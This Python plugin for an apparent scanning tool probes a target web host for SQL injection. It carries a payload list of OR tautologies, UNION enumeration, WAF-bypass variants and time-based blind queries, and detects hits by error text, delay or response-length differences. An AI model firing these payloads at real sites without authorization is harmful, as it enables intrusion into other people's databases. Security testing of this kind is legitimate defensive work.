# plugins/sqli_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner SQL Injection via GET.
    2026 Intel: WAF bypass (case alternation, inline comments, JSON injection),
    time-based blind, error-based, UNION-based column enum.
    """
    import requests
    import time

    params = ["id", "user", "username", "page", "name", "search", "query", "cat",
              "item", "product", "order", "sort", "filter", "type", "action"]
    payloads = [
        # Error-based
        ("' OR '1'='1", "CLASSIC_OR"),
        ("' OR '1'='1' --", "CLASSIC_COMMENT"),
        ("' OR '1'='1' #", "HASH_COMMENT"),
        ("1' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL_VERSION"),
        ("' UNION SELECT NULL--", "UNION_NULL"),
        ("' UNION SELECT NULL,NULL--", "UNION_2COL"),
        ("' UNION SELECT NULL,NULL,NULL--", "UNION_3COL"),
        # WAF bypass 2026
        ("' oR '1'='1", "CASE_ALTERNATION"),
        ("'/**/OR/**/1=1--", "INLINE_COMMENT"),
        ("' OR 1=1-- -", "DOUBLE_DASH_SPACE"),
        ("1' aNd 1=1 aNd '1'='1", "MIXED_CASE_AND"),
        # Time-based blind
        ("' OR SLEEP(3)--", "TIME_MYSQL"),
        ("'; WAITFOR DELAY '0:0:3'--", "TIME_MSSQL"),
        ("' OR pg_sleep(3)--", "TIME_POSTGRES"),
        # Boolean-based
        ("' AND 1=1--", "BOOL_TRUE"),
        ("' AND 1=2--", "BOOL_FALSE"),
    ]
    sql_errors = [
        "sql syntax", "mysql_fetch", "ora-", "pg_query", "sqlite3",
        "unclosed quotation", "you have an error in your sql",
        "microsoft ole db", "syntax error", "query failed",
        "warning: mysql", "valid mysql result", "postgresql",
        "unterminated string", "quoted string not properly terminated",
    ]
    vulns = []

    for param in params:
        for payload, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                start = time.time()
                resp = requests.get(url, timeout=10)
                elapsed = time.time() - start

                # Error-based detection
                for err in sql_errors:
                    if err.lower() in resp.text.lower():
                        vulns.append({
                            "tipo": "SQLI_ERROR_BASED", "metodo": method,
                            "parametro": param, "severidade": "CRITICO",
                            "erro": err, "amostra": resp.text[:200],
                        })
                        break

                # Time-based detection
                if "TIME_" in method and elapsed > 2.5:
                    vulns.append({
                        "tipo": "SQLI_TIME_BASED", "metodo": method,
                        "parametro": param, "severidade": "CRITICO",
                        "tempo": round(elapsed, 2),
                    })

                # Boolean-based differential
                if method == "BOOL_TRUE":
                    bool_true_len = len(resp.text)
                elif method == "BOOL_FALSE":
                    bool_false_len = len(resp.text)
                    if abs(bool_true_len - bool_false_len) > 50:
                        vulns.append({
                            "tipo": "SQLI_BLIND_BOOLEAN",
                            "parametro": param, "severidade": "ALTO",
                            "diff": abs(bool_true_len - bool_false_len),
                        })

            except Exception:
                continue

    return {"plugin": "sqli_scanner", "resultados": vulns if vulns else "Nenhuma SQL injection detectada"}
